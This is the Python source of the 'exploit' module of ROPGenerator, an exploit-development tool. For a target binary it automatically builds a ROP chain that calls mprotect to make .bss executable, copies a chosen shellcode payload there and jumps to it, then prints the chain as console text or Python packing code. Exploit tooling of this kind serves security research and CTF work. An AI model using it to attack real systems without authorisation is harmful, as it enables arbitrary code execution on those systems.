# ROPGenerator - Exploit module 
# Building exploits for a binary :D !!
import ropgenerator.Context as Context
import ropgenerator.BinaryScanner as BinaryScanner
import ropgenerator.Analysis as Analysis
from ropgenerator.exploit.mprotect import mprotect_X64, mprotect_X86
from ropgenerator.payload.Shellcode import selected
from ropgenerator.SearchEngine import search
from ropgenerator.Gadget import GadgetType
from ropgenerator.Constraints import Constraint, ConstraintType 
import ropgenerator.SearchHelper as SearchHelper
import ropgenerator.Database as Database
from ropgenerator.Colors import disable_colors, enable_colors, verbose_mode, string_ropg, info, string_bold, string_special, string_exploit, info_colored, notify
import sys

# Options
OPTION_VERBOSE = '--verbose'
OPTION_OUTPUT = '--output-format'
OPTION_OUTFILE = '--output-file'
# Short options
OPTION_VERBOSE_SHORT = '-v'
OPTION_OUTPUT_SHORT = '-f'
OPTION_OUTFILE_SHORT ='-o' 

# Options for output
OUTPUT_CONSOLE = 'console'
OUTPUT_PYTHON = 'python'
OUTPUT_RAW = 'raw'

# Help
CMD_EXPLOIT_HELP = string_bold("\n\t-------------------------------")
CMD_EXPLOIT_HELP += string_bold("\n\tROPGenerator 'exploit' command\n\t")
CMD_EXPLOIT_HELP += string_special("(Build exploits automatically)")
CMD_EXPLOIT_HELP += string_bold("\n\t-------------------------------")
CMD_EXPLOIT_HELP += "\n\n\t"+string_bold("Usage")+":\texploit [OPTIONS] <"+string_ropg("subcommand")+">"
CMD_EXPLOIT_HELP += "\n\n\t"+string_bold("Sub-commands")+":"+\
"\n\t\t"+string_ropg("run-payload")+"\t("+string_special('build an exploit that runs the selected payload')+")"
CMD_EXPLOIT_HELP += "\n\n\t"+string_bold("Options")+":"
CMD_EXPLOIT_HELP += "\n\t\t"+string_special(OPTION_VERBOSE_SHORT)+","+string_special(OPTION_VERBOSE)
CMD_EXPLOIT_HELP += "\n\t\t"+string_special(OPTION_OUTPUT_SHORT)+","+string_special(OPTION_OUTPUT)+" <"+'|'.join([string_special(g) for g in [OUTPUT_CONSOLE, OUTPUT_PYTHON]])+">"
CMD_EXPLOIT_HELP += "\n\t\t"+string_special(OPTION_OUTFILE_SHORT)+","+string_special(OPTION_OUTFILE)+" <filename>"

def print_help():
    print(CMD_EXPLOIT_HELP)

def print_exploit(exploit, output, outstream, colors=True):
    """
    Exploit format is a list of pairs (ropchain, description)
    
    """
    if( not colors ): 
        disable_colors()
    
    if( output == OUTPUT_CONSOLE ):
        print(string_bold("\n\tBuilt exploit - {} bytes\n".format((Analysis.ArchInfo.bits/8)*sum([len(chain) for (chain,info) in exploit]))))
        for (chain, info) in exploit:
            info_string = string_bold("\t"+'-'*len(info)+'\n')+string_exploit('\t'+info+'\n')+string_bold("\t"+'-'*len(info)+'\n')
            outstream.write(info_string)
            for gadget_num in chain:
                if( SearchHelper.is_padding(gadget_num)):
                    padding_str = string_special('0x'+format(SearchHelper.get_padding_unit(gadget_num), '0'+str(Analysis.ArchInfo.bits/4)+'x'))
                    if( gadget_num == SearchHelper.DEFAULT_PADDING_UNIT_INDEX ):
                        padding_str += " (Padding)"
                    elif( gadget_num in SearchHelper.num_to_str ):
                        padding_str += " ("+SearchHelper.num_to_str[gadget_num]+")"
                    elif( SearchHelper.get_padding_unit(gadget_num) in SearchHelper.addr_to_gadgetStr ):
                        padding_str += " ("+SearchHelper.addr_to_gadgetStr[SearchHelper.get_padding_unit(gadget_num)]+")"
                    else:
                        padding_str += " (Custom Padding)"
                    outstream.write("\t"+padding_str+"\n")
                else:
                    outstream.write("\t"+string_special(Database.gadgetDB[gadget_num].addrStr) + " (" + string_bold(Database.gadgetDB[gadget_num].asmStr) + ")\n")
    elif( output == OUTPUT_PYTHON ):
        # Getting endianness to pack values 
        if( Analysis.ArchInfo.bits == 32 ):
            endianness_str = '<I'
        else:
            endianness_str = '<Q'
        pack_str = "p += pack("+endianness_str+","
        # Printing 
        outstream.write(string_bold("\n\tBuilt exploit - {} bytes\n".format((Analysis.ArchInfo.bits/8)*sum([len(chain) for (chain,info) in exploit])))+'\n')
        outstream.write(string_bold("\t#"+'-------------\n'))
        outstream.write(string_exploit('\t# Padding here\n'))
        outstream.write(string_bold("\t#"+'-------------\n'))
        outstream.write("\tp = ''\n")
        for (chain, info) in exploit:
            outstream.write(string_bold("\t# "+'-'*len(info))+'\n')
            outstream.write(string_exploit('\t# '+info)+'\n')
            outstream.write(string_bold("\t# "+'-'*len(info))+'\n')
            for gadget_num in chain:
                if( SearchHelper.is_padding(gadget_num)):
                    padding_str = pack_str
                    padding_str += string_special('0x'+format(SearchHelper.get_padding_unit(gadget_num), '0'+str(Analysis.ArchInfo.bits/4)+'x'))+")"
                    if( gadget_num == SearchHelper.DEFAULT_PADDING_UNIT_INDEX ):
                        padding_str += " # Padding"
                    elif( gadget_num in SearchHelper.num_to_str ):
                        padding_str += " # "+SearchHelper.num_to_str[gadget_num]
                    elif( SearchHelper.get_padding_unit(gadget_num) in SearchHelper.addr_to_gadgetStr ):
                        padding_str += " # "+SearchHelper.addr_to_gadgetStr[SearchHelper.get_padding_unit(gadget_num)]
                    else:
                        padding_str += " # Custom Padding"
                    outstream.write("\t"+padding_str+"\n")
                else:
                    outstream.write("\t"+pack_str+string_special(Database.gadgetDB[gadget_num].addrStr) + ") # " + string_bold(Database.gadgetDB[gadget_num].asmStr)+'\n')

    elif( output == OUTPUT_RAW ):
        print("\tRaw output not supported yet :'( ")
       
    enable_colors()

# Build an exploit 
def exploit(args):
    # Parse args
    i = 0
    verbose = False
    output = OUTPUT_CONSOLE
    outfile = sys.stdout
    seenOutput = False
    seenOutfile = False
    colors = True
    while( i < len(args) and args[i][0] == '-' ):
        if( args[i] == OPTION_VERBOSE or args[i] == OPTION_VERBOSE_SHORT ):
            verbose = True
        elif( args[i] == OPTION_OUTPUT or args[i] == OPTION_OUTPUT_SHORT ):
            if( seenOutput ):
                print(string_bold("\n\tError. '" + OPTION_OUTPUT + "' option should be used only once."))
                return 
            if( i+1 >= len(args)):
                print(string_bold("\n\tError. Missing output format after option '"+args[i]+"'"))
                return 
            if( args[i+1] in [OUTPUT_CONSOLE, OUTPUT_PYTHON]):
                output = args[i+1]
                seenOutput = True
                i = i +1
            else:
                print(string_bold("\n\tError. '" + args[i+1] + "' output format is not supported"))
                return 
        elif( args[i] == OPTION_OUTFILE or args[i] == OPTION_OUTFILE_SHORT ):
            if( seenOutfile ):
                print(string_bold("\n\tError. '" + OPTION_OUTFILE + "' option should be used only once."))
                return 
            if( i+1 >= len(args)):
                print(string_bold("\n\tError. Missing output format after option '"+args[i]+"'"))
                return
            try:
                outfile = open(args[i+1], "w")
                seenOutfile = True
                colors=False # No ANSI colors when writing in file 
                i = i + 1
            except:
                print(string_bold("\n\tError. Could not open file '{}'".format(args[i+1])))
                return 
        else:
            print(string_bold("\n\tUnknown option '{}'".format(args[i])))
            return 
        i = i+1
    # Process options
    verbose_mode(verbose)
    
    if( i == len(args)):
        print(string_bold("\n\tMissing sub-command\n\tType 'exploit help' for help".format(args[0])))
        return 
        
    # BuIld exploit
    if( args[i] == 'run-payload' ):
        exploit_chain = run_payload()
        if( exploit_chain ):
            print_exploit(exploit_chain, output, outfile, colors)
        else:
            print(string_bold("\n\tFailed to build exploit"))
    else:
        print(string_bold("\n\tSub-command '{}' not supported".format(args[0])))
    
    # Restore normal state
    verbose_mode(False)
    # Close output stream 
    if( seenOutfile ):
        outfile.close()

def run_payload():
    """
    Builds an exploit that aims at executing a payload 
    """
    # get the shellcode 
    (payload, payload_info ) = selected(Analysis.ArchInfo.currentArch)
    if( not payload):
        print(string_bold("\n\tError, no payload selected :/"+"\n\tCheck the 'payload select' command "))
        return 
        
    # Check context
    Context.check_context()
    
    # Build exploit
    exploit = build_mprotect_datareuse(payload)
    return exploit


def build_mprotect_datareuse(payload):
    """
    Build a ROPchain that does :
        - mprotect RWX to a static memory area
        - copy payload to this memory area
        - jmp to payload 
    """
    info_colored(string_bold('Building mprotect + datareuse exploit\n'))
    
    # Get the initial constraint 
    constraint = Constraint().add(ConstraintType.BAD_BYTES, Context.bad_bytes())
    
    # Then get address of the bss
    notify('Getting .bss address')
    bss_addr = BinaryScanner.bss_address()
    if( not bss_addr ):
        info("Could not find static .bss section to copy payload to")
        return []
    else:
        info("Found .bss at address: "+hex(bss_addr))
    
    # Then get the mprotect chain
    notify('Building mprotect ropchain to make .bss RWX')   
    if( Analysis.ArchInfo.currentArch == "X86-64" ):
        mprotect_chain = mprotect_X64(bss_addr, len(payload)+1, 7)
    elif( Analysis.ArchInfo.currentArch == "X86" ):
        mprotect_chain = mprotect_X86(bss_addr, len(payload)+1, 7)
    else:
        info("mprotect chain for arch '{}' not supported yet".format(Analysis.ArchInfo.currentArch))
        return []
    if( not mprotect_chain ):
        info("Could not build mprotect chain")
        return []
    mprotect_info = "Create RWX memory : calling mprotect({},{},{})".format(hex(bss_addr), len(payload)+1,7) 
    
    # Then write shellcode in memory 
    notify('Building data-reuse chain to copy payload into .bss') 
    datareuse = search.str_to_mem(bss_addr, '.bss', payload, constraint.add(ConstraintType.CHAINABLE_RET,[]), hex_info=True)
    if( not datareuse ):
        info("Could not build datareuse chain")
        return []
    datareuse_info = "Copy payload into custom RWX memory"
    
    notify('Building a chain to jump to .bss and execute payload')
    # Then jump to the payload
    ip_num = Analysis.regNamesTable[Analysis.ArchInfo.ip]
    jmp_payload = search.jmp_addr(bss_addr, constraint)
    if( not jmp_payload ):
        info("Could not build jmp_payload chain")
        return []
    jmp_payload_info = "Jump to payload"
    # Concatenate to full exploit
    return [[mprotect_chain,mprotect_info],[datareuse,datareuse_info],[jmp_payload, jmp_payload_info]]
